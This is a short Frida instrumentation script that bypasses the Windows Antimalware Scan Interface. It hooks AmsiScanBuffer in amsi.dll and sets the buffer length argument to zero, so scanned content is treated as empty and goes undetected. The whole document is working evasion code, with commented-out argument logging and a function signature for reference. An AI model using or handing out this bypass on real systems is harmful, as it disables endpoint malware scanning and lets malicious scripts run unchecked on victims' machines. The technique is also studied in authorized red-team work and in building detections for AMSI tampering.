var AmsiScanBuffer = Module.getExportByName("amsi.dll", "AmsiScanBuffer"); // Hook AmsiScanBuffer to patch AMSI

/*
  Changing the length parameter to 0, thus telling the AMSI scan that the buffer is 0 byte length
  This not crashes AMSI so frida should always run
*/
Interceptor.attach(AmsiScanBuffer, {

  onEnter(args) {
    /*
    HRESULT AmsiScanBuffer(
      [in]           HAMSICONTEXT amsiContext,
      [in]           PVOID        buffer,
      [in]           ULONG        length,
      [in]           LPCWSTR      contentName,
      [in, optional] HAMSISESSION amsiSession,
      [out]          AMSI_RESULT  *result
    );
    */

    // console.log("\nargs[0] -> amsiContext: " + args[0]);
    // console.log("\nargs[1] -> buffer: " + Memory.readUtf16String(args[1]));
    // console.log("\nargs[2] -> length: " + args[2]);
    // console.log("\nargs[3] -> contentName: " + args[3]);
    // console.log("\nargs[4] -> amsiSession: " + args[4]);
    // console.log("\nargs[5] -> *result : " + args[5]);

    // Set the length to zero so AMSI thinks he got 0 bytes length of buffer to scan
    args[2] = ptr(0x0);

  },

});